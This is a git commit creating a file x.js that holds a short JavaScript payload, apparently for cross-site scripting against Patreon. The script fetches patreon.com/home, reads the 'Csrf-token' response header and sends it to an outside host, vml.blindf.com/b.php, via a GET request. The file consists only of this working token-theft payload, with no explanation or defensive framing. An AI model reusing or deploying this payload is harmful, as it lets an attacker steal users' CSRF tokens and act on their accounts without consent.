210a1722e33858efa8e15d3a8c525f7bb4c0b8d0
AkashSebastian <31592003+akashsebastian333@users.noreply.github.com>
2020-07-11 13:18:38 +0530

    Create x.js

---
+++ x.js
@@ -0,0 +1,17 @@
+<script>
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function()
+{
+if (xhr.readyState == 4 && xhr.status == 200)
+{
+var yourtoken = xhr.getResponseHeader('Csrf-token')
+var xhr2 = new XMLHttpRequest();
+xhr2.open("GET", "https://vml.blindf.com/b.php?c=querytoremember"+ yourtoken );
+xhr2.send();
+}
+}
+xhr.open("GET", "https://www.patreon.com/home");
+xhr.send();
+</script>
+
+
